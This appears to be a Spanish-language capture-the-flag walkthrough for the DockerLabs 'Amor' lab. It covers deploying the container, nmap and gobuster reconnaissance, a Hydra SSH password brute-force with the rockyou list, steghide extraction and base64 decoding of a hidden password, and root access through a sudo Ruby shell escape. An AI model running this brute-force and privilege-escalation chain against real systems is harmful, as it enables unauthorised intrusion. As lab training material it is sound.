DockerLabs - Reto AMOR
Este laboratorio forma parte de la plataforma DockerLabs y corresponde a un reto de dificultad Fácil. Tiene como objetivo introducir herramientas básicas de pentesting sobre entornos Docker usando técnicas de escaneo, fuerza bruta y esteganografía.

🛠 Prerrequisitos
Sistema base: Kali Linux

Docker instalado:

bash
Copier
Modifier
sudo apt install docker.io
🚚 Despliegue del Laboratorio
Transferir los archivos del reto:

bash
Copier
Modifier
scp -r amor kali@192.168.1.12:/home/kali/Documents/
Descomprimir recursos (si aplica):

bash
Copier
Modifier
unzip amor.zip
Otorgar permisos y ejecutar:

bash
Copier
Modifier
chmod +x auto_deploy.sh
./auto_deploy.sh amor.tar
🔍 Reconocimiento
Obtener interfaz:

bash
Copier
Modifier
ip add
Descubrimiento de red:

bash
Copier
Modifier
sudo netdiscover -i docker0 -r 172.17.0.0/24
Escaneo de puertos:

bash
Copier
Modifier
sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
🌐 Enumeración Web
Accedemos al puerto 80 pero no hay información directa. Se lanza fuzzing:

bash
Copier
Modifier
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
🔐 Ataque por Fuerza Bruta
Usuarios encontrados en el HTML del sitio: carlota y juan.

Ataque SSH usando Hydra:

bash
Copier
Modifier
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
Accedemos vía SSH:

bash
Copier
Modifier
ssh carlota@172.17.0.2
🖼 Extracción de Evidencia
Navegamos al directorio de imágenes:

bash
Copier
Modifier
cd /carlota/Desktop/fotos/vacaciones
Transferimos la imagen:
bash
Copier
Modifier
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
Inspeccionamos el tipo de archivo:

bash
Copier
Modifier
file imagen.jpg
🕵‍♀ Esteganografía
Extraemos información oculta:

bash
Copier
Modifier
steghide extract -sf imagen.jpg
Decodificamos el contenido del archivo secreto:

bash
Copier
Modifier
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
🧑‍💻 Escalamiento de Privilegios
Accedemos como otro usuario:

bash
Copier
Modifier
su oscar
Comprobamos acceso con sudo:

bash
Copier
Modifier
sudo -l
Acceso a bash mediante Ruby:

bash
Copier
Modifier
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
Verificamos identidad:

bash
Copier
Modifier
whoami
🧾 Cuadro de Herramientas Utilizadas
Se puede consultar el siguiente archivo Excel para la definición, funcionalidad y casos de uso de cada herramienta empleada: Resumen_Herramientas_DockerLabs.xlsx.

🧰 Comandos y Variantes
(Se sugiere agregar un archivo complementario comandos.md con descripciones detalladas de cada comando, sus parámetros y alternativas.)

🔁 Diagrama de Flujo


📌 Créditos
Laboratorio original: dockerlabs.es 
